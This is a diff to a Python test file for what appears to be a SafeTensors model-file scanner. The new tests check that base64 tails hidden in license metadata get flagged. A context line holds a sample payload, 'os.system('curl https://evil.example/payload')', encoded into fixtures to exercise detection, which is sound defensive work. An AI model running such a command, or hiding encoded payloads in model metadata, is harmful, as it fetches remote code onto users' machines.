@@ -141,6 +141,11 @@ def executable_wrapped_base64_lines(widths: tuple[int, ...] = (76,)) -> list[str
     return lines
 
 
+def opaque_wrapped_base64_lines(width: int = 76) -> list[str]:
+    encoded = base64.b64encode(bytes(index % 251 for index in range(1200))).decode("ascii")
+    return [encoded[index : index + width] for index in range(0, len(encoded), width)]
+
+
 def padded_executable_wrapped_base64_lines(chunk_size: int = 2) -> list[str]:
     payload = ("import os\nos.system('curl https://evil.example/payload')\n" * 8).encode("utf-8")
     return [
@@ -1020,6 +1025,44 @@ def test_long_license_metadata_wrapped_active_base64_tail_reports_wrapped_opaque
     file_path = tmp_path / "long_license_metadata_active_wrapped_base64_tail.safetensors"
     license_text = long_ordinary_license_text_with_incidental_tokens()
     tail = "\n".join(f"License grant continuation {line}" for line in executable_wrapped_base64_lines((31,)))
+    payload = f"{license_text}\n{tail}"
+    write_raw_safetensors(
+        file_path,
+        {
+            "tensor": {"dtype": "U8", "shape": [1], "data_offsets": [0, 1]},
+            "__metadata__": {"license": payload},
+        },
+        b"\x00",
+    )
+
+    result = SafeTensorsScanner().scan(str(file_path))
+
+    assert len(payload) > 1000
+    assert "http://" not in payload
+    assert "https://" not in payload
+    assert not SafeTensorsScanner._is_ordinary_license_metadata_value("license", payload, metadata_is_valid=True)
+    assert set(result.metadata["custom_metadata_security_flags"]) >= {"suspicious_pattern", "unusually_long_value"}
+    assert any(issue.rule_code == "S905" and "license" in issue.message for issue in result.issues)
+    assert any(
+        check.name == "Metadata Length Check"
+        and check.status == CheckStatus.FAILED
+        and check.details.get("key") == "license"
+        for check in result.checks
+    )
+    assert any(
+        check.name == "Metadata Pattern Check"
+        and check.status == CheckStatus.FAILED
+        and check.details == {"key": "license", "pattern": "wrapped-opaque-token"}
+        for check in result.checks
+    )
+
+
+def test_long_license_metadata_annotated_wrapped_opaque_tail_reports_wrapped_opaque_token(
+    tmp_path: Path,
+) -> None:
+    file_path = tmp_path / "long_license_metadata_annotated_opaque_wrapped_base64_tail.safetensors"
+    license_text = long_ordinary_license_text_with_incidental_tokens()
+    tail = "\n".join(f"License grant continuation {line}" for line in opaque_wrapped_base64_lines())
     payload = f"{license_text}\n{tail}"
     write_raw_safetensors(
         file_path,
